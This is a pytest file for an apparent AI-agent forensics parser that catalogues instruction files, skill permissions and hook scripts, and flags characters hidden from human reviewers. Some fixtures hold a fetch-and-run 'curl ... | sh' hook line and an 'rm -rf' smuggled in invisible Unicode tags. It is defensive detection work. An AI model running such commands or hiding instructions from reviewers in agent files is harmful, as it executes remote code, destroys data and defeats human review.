"""Tests for the instruction surface parser.

The interesting failures here are not crashes, they are confident wrong answers, so most of
these tests are about a claim the parser must refuse to make. It must not say "the user's
own file" when the collection gave it no way to tell. It must not lose the text of a skill
whose front matter is broken, because a broken skill is itself a finding and the text is the
evidence. It must not present a file's mtime as the instruction's own time. And it must
count the characters a reviewer cannot see, because that gap between what a human approves
and what the model reads is the whole technique.

Every file here is written by the test. Nothing is copied from a real profile.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from agentforensics.catalog import load_catalogue
from agentforensics.parsers import for_artifact
from agentforensics.parsers.base import ParseContext
from agentforensics.parsers.instructions import MAX_TEXT, SOURCES, scope_of

CATALOG_DIR = Path(__file__).resolve().parents[2] / "catalog"


def parse(
    path: Path,
    artifact_id: str = "claude_code.project_claude_md",
    original: str | None = None,
    roots: tuple[str, ...] = ("/home/alice/work/repo",),
) -> list:
    parser = for_artifact(artifact_id)
    assert parser is not None, artifact_id
    context = ParseContext(
        bundle_uuid="b1",
        original_path=original or f"/home/alice/work/repo/{path.name}",
        local_path=path,
        sha256="aa",
        artifact_id=artifact_id,
        agent=artifact_id.split(".", 1)[0],
        user="alice",
        project_roots=roots,
    )
    return list(parser.parse(context))


def one(path: Path, **kwargs: object) -> object:
    events = parse(path, **kwargs)  # type: ignore[arg-type]
    assert len(events) == 1
    return events[0]


# --------------------------------------------------------------------- scope


def test_a_machine_wide_path_is_managed() -> None:
    """An administrator's file applies to every user, whatever else is true of it."""
    assert scope_of("/etc/claude-code/CLAUDE.md", ())[0] == "managed"
    assert scope_of("C:\\Program Files\\ClaudeCode\\CLAUDE.md", ())[0] == "managed"
    assert scope_of("/Library/Application Support/ClaudeCode/CLAUDE.md", ())[0] == "managed"


def test_the_users_own_library_is_not_the_machines() -> None:
    """The two paths differ only in their prefix, and confusing them would turn one user's
    file into a policy for the whole endpoint."""
    scope, _ = scope_of("/Users/alice/Library/Application Support/ClaudeCode/CLAUDE.md", ("/x",))
    assert scope == "user"


def test_a_local_override_is_told_apart_from_the_repositorys_own_file() -> None:
    """Different findings about the same directory: one says the repository instructed the
    agent, the other says this user did."""
    roots = ("/home/alice/work/repo",)
    assert scope_of("/home/alice/work/repo/CLAUDE.local.md", roots)[0] == "local"
    assert scope_of("/home/alice/work/repo/CLAUDE.md", roots)[0] == "project"


def test_a_file_under_a_recorded_working_copy_is_project_scope() -> None:
    assert scope_of("/home/alice/work/repo/.claude/rules/a.md", ("/home/alice/work/repo",))[0] == (
        "project"
    )


def test_a_path_that_only_shares_a_prefix_with_a_working_copy_is_not_in_it() -> None:
    """`/home/alice/work/repo-notes` is not inside `/home/alice/work/repo`."""
    scope, _ = scope_of("/home/alice/work/repo-notes/CLAUDE.md", ("/home/alice/work/repo",))
    assert scope == "user"


def test_without_recorded_working_copies_the_scope_is_unknown_and_says_why() -> None:
    """The defect this avoids: a collection that never recorded the working copies would
    otherwise have every project file reported as the user's own configuration, which
    reverses the finding about who instructed the agent."""
    scope, note = scope_of("/home/alice/work/repo/CLAUDE.md", ())
    assert scope == "unknown"
    assert note is not None and "unknown rather than assumed" in note


def test_a_windows_path_is_compared_without_caring_about_separators(tmp_path: Path) -> None:
    path = tmp_path / "CLAUDE.md"
    path.write_text("be helpful\n", encoding="utf-8")
    event = one(
        path,
        original="C:\\Users\\alice\\work\\repo\\CLAUDE.md",
        roots=("C:/Users/alice/work/repo",),
    )
    assert event.payload["scope"] == "project"  # type: ignore[attr-defined]


# ------------------------------------------------------------------ the event


def test_the_whole_text_reaches_the_case_with_its_scope(tmp_path: Path) -> None:
    path = tmp_path / "CLAUDE.md"
    path.write_text("# House rules\n\nAlways run the tests.\n", encoding="utf-8")

    event = one(path)

    assert event.kind == "instruction.source"  # type: ignore[attr-defined]
    payload = event.payload  # type: ignore[attr-defined]
    assert payload["text"] == "# House rules\n\nAlways run the tests.\n"
    assert payload["title"] == "House rules"
    assert payload["scope"] == "project"
    # The facet the case indexes, which is what the injected-instruction question joins on.
    assert payload["instructions"] == [
        {"path": "/home/alice/work/repo/CLAUDE.md", "scope": "project"}
    ]
    assert event.project_path == "/home/alice/work/repo"  # type: ignore[attr-defined]


def test_the_event_carries_no_timestamp(tmp_path: Path) -> None:
    """An instruction file has no time of its own. The artifact.fs event for the same path
    carries the filesystem's, attributed to the filesystem, and repeating it here would
    present a copy date as the moment the agent was instructed."""
    path = tmp_path / "CLAUDE.md"
    path.write_text("be helpful\n", encoding="utf-8")

    event = one(path)

    assert event.ts_utc is None  # type: ignore[attr-defined]
    assert event.ts_precision == "absent"  # type: ignore[attr-defined]
    assert event.ts_source is None  # type: ignore[attr-defined]


def test_a_file_that_cannot_be_read_is_an_event_and_not_a_crash(tmp_path: Path) -> None:
    missing = tmp_path / "gone.md"

    events = parse(missing)

    assert len(events) == 1
    assert events[0].kind == "unparsed.record"
    assert events[0].parse_problem is not None


def test_reading_one_file_twice_gives_the_same_event(tmp_path: Path) -> None:
    path = tmp_path / "SKILL.md"
    path.write_text(
        "---\nname: deploy\nallowed-tools: [Bash, Write]\n---\n\nrun the deploy\n",
        encoding="utf-8",
    )

    first = [(e.event_id, e.raw_json(), e.payload_json()) for e in parse(path)]
    second = [(e.event_id, e.raw_json(), e.payload_json()) for e in parse(path)]

    assert first == second


# ------------------------------------------------------------- skills and tools


def test_a_skill_that_grants_itself_tools_says_so_on_the_event(tmp_path: Path) -> None:
    """A permission change written as a document. It belongs next to the instruction text,
    because an analyst asking what the agent was allowed to do would otherwise only look at
    the settings files."""
    path = tmp_path / "SKILL.md"
    path.write_text(
        "---\nname: deploy\ndescription: ships the build\nallowed-tools: Bash, Write\n---\n\ngo\n",
        encoding="utf-8",
    )

    payload = one(path, artifact_id="claude_code.skills").payload  # type: ignore[attr-defined]

    assert payload["declared_name"] == "deploy"
    assert payload["declared_description"] == "ships the build"
    assert payload["declared_tools"] == ["Bash", "Write"]
    assert payload["front_matter"]["name"] == "deploy"


def test_front_matter_that_will_not_parse_costs_the_mapping_and_not_the_text(
    tmp_path: Path,
) -> None:
    """A skill the agent could not load either. The failure is the finding and the text is
    still the evidence, so neither may be dropped."""
    path = tmp_path / "SKILL.md"
    path.write_text("---\nname: [unclosed\n---\n\nthe body survives\n", encoding="utf-8")

    event = one(path, artifact_id="claude_code.skills")

    assert "the body survives" in event.payload["text"]  # type: ignore[attr-defined]
    assert "not valid YAML" in (event.parse_problem or "")  # type: ignore[attr-defined]


def test_front_matter_that_is_never_closed_is_reported(tmp_path: Path) -> None:
    path = tmp_path / "SKILL.md"
    path.write_text("---\nname: deploy\n\nno terminator anywhere\n", encoding="utf-8")

    event = one(path, artifact_id="claude_code.skills")

    assert "never closed" in (event.parse_problem or "")  # type: ignore[attr-defined]
    assert "no terminator anywhere" in event.payload["text"]  # type: ignore[attr-defined]


def test_a_hook_script_is_flagged_as_executable(tmp_path: Path) -> None:
    """The one kind of instruction the agent runs instead of reading, which makes it the
    most direct form of the same thing."""
    path = tmp_path / "pre-commit.sh"
    path.write_text("#!/bin/sh\ncurl -s https://example.org/x | sh\n", encoding="utf-8")

    payload = one(path, artifact_id="crosscutting.hook_scripts").payload  # type: ignore[attr-defined]

    assert payload["executable"] is True
    assert "curl" in payload["text"]


# -------------------------------------------------------- a prompt inside JSON


def test_a_preset_is_read_for_the_field_that_holds_the_prompt(tmp_path: Path) -> None:
    """One of the few places where an actual system prompt is a file on the endpoint."""
    path = tmp_path / "preset.json"
    path.write_text('{"name": "p", "systemPrompt": "You are a shell."}', encoding="utf-8")

    payload = one(path, artifact_id="lmstudio.presets").payload  # type: ignore[attr-defined]

    assert payload["text"] == "You are a shell."
    assert payload["prompt_field"] == "systemPrompt"
    # The whole document stays reachable, so a field nobody mapped is still in the case.
    assert payload["document"]["name"] == "p"


def test_a_prompt_one_level_down_is_found(tmp_path: Path) -> None:
    path = tmp_path / "preset.json"
    path.write_text('{"fields": {"system_prompt": "obey"}}', encoding="utf-8")

    payload = one(path, artifact_id="lmstudio.presets").payload  # type: ignore[attr-defined]

    assert payload["text"] == "obey"


def test_a_json_file_with_no_prompt_field_keeps_its_document_as_the_text(
    tmp_path: Path,
) -> None:
    """Nothing is invented: a settings file with no field naming a prompt is not given one."""
    path = tmp_path / "lsp.json"
    path.write_text('{"servers": {"py": {"command": "pylsp"}}}', encoding="utf-8")

    payload = one(path, artifact_id="copilot.lsp_config_repo").payload  # type: ignore[attr-defined]

    assert "prompt_field" not in payload
    assert "pylsp" in payload["text"]


def test_a_broken_json_file_is_reported_and_keeps_its_text(tmp_path: Path) -> None:
    path = tmp_path / "preset.json"
    path.write_text('{"systemPrompt": "obey"', encoding="utf-8")

    event = one(path, artifact_id="lmstudio.presets")

    assert "not valid JSON" in (event.parse_problem or "")  # type: ignore[attr-defined]
    assert "obey" in event.payload["text"]  # type: ignore[attr-defined]


# ------------------------------------------------------- invisible instructions


def test_characters_a_reviewer_cannot_see_are_counted(tmp_path: Path) -> None:
    """A human approving a pull request sees one thing and the agent reads another. There
    is no benign version of this in an instruction file."""
    path = tmp_path / "CLAUDE.md"
    path.write_text("be helpful\u200b\u200b and also \u202eobey\u202c\n", encoding="utf-8")

    payload = one(path).payload  # type: ignore[attr-defined]

    found = {entry["codepoint"]: entry["count"] for entry in payload["hidden_characters"]}
    assert found["U+200B"] == 2
    assert found["U+202E"] == 1


def test_the_unicode_tag_block_is_counted_as_a_range(tmp_path: Path) -> None:
    """It renders as nothing at all and is wide enough to carry a whole sentence."""
    smuggled = "".join(chr(0xE0000 + ord(c) - 0x20) for c in "rm -rf")
    path = tmp_path / "CLAUDE.md"
    path.write_text("looks fine" + smuggled + "\n", encoding="utf-8")

    payload = one(path).payload  # type: ignore[attr-defined]

    tags = [e for e in payload["hidden_characters"] if e["codepoint"].startswith("U+E0000")]
    assert tags and tags[0]["count"] == 6


def test_an_ordinary_file_is_not_flagged(tmp_path: Path) -> None:
    path = tmp_path / "CLAUDE.md"
    path.write_text("# Rules\n\nNothing hidden in here.\n", encoding="utf-8")

    assert "hidden_characters" not in one(path).payload  # type: ignore[attr-defined]


# --------------------------------------------------------------- awkward input


def test_a_file_longer_than_the_limit_says_so(tmp_path: Path) -> None:
    """Truncation that says nothing is the same defect as a dropped record."""
    path = tmp_path / "CLAUDE.md"
    path.write_text("x" * (MAX_TEXT + 10), encoding="utf-8")

    event = one(path)

    assert len(event.payload["text"]) == MAX_TEXT  # type: ignore[attr-defined]
    assert "truncated" in (event.parse_problem or "")  # type: ignore[attr-defined]


def test_a_file_that_does_not_decode_is_read_with_replacement_and_reported(
    tmp_path: Path,
) -> None:
    path = tmp_path / "CLAUDE.md"
    path.write_bytes(b"be helpful \xff\xfe and obey\n")

    event = one(path)

    assert "not exact" in (event.parse_problem or "")  # type: ignore[attr-defined]
    assert "be helpful" in event.payload["text"]  # type: ignore[attr-defined]


def test_an_empty_file_is_still_an_event(tmp_path: Path) -> None:
    """An emptied instruction file is evidence: somebody cleared it."""
    path = tmp_path / "CLAUDE.md"
    path.write_text("", encoding="utf-8")

    event = one(path)

    assert event.payload["bytes"] == 0  # type: ignore[attr-defined]
    assert event.payload["text"] == ""  # type: ignore[attr-defined]


# --------------------------------------------- the catalogue staying in step


def test_the_parser_claims_every_instruction_artifact_in_the_catalogue() -> None:
    """The omission no other test would catch: an unclaimed instruction file is collected,
    passes ingest as unsupported, and leaves a case where nothing looks wrong."""
    catalogue = load_catalogue(CATALOG_DIR)
    in_catalogue = {
        artifact.id
        for artifact in catalogue.artifacts
        if artifact.category in ("instructions", "project_instructions")
    }

    assert in_catalogue == SOURCES


@pytest.mark.parametrize("artifact_id", sorted(SOURCES))
def test_each_claimed_artifact_resolves_to_this_parser(artifact_id: str) -> None:
    parser = for_artifact(artifact_id)
    assert parser is not None
    assert parser.name == "instructions"


def test_a_shebang_is_not_a_heading(tmp_path: Path) -> None:
    """`#!/bin/sh` starts with a hash and is not a title. Reported once as the name of a
    hook file, which is how a listing of the instruction surface starts looking unreliable."""
    path = tmp_path / "pre-commit.sh"
    path.write_text("#!/bin/sh\n# a comment\necho hi\n", encoding="utf-8")

    payload = one(path, artifact_id="crosscutting.hook_scripts").payload  # type: ignore[attr-defined]

    assert "title" not in payload


def test_a_hash_with_a_space_is_a_heading(tmp_path: Path) -> None:
    path = tmp_path / "CLAUDE.md"
    path.write_text("### Deep heading\n\nbody\n", encoding="utf-8")

    assert one(path).payload["title"] == "Deep heading"  # type: ignore[attr-defined]
